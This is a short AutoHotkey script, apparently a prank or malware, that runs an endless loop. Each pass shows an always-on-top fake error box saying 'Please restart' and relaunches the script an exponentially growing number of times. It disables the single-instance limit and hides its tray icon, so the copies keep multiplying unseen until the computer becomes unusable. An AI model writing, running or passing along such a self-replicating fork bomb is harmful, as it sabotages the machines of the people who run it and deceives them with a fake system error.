#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

::
i = 1
while 3 > 2 
{
MsgBox, 262144, Error #%i%256, Please restart 
Loop %i% 
{ 
Run, %A_ScriptFullPath% 
} 
i*=2
} 
Return

#SingleInstance Off
#NoTrayIcon
#KeyHistory 0

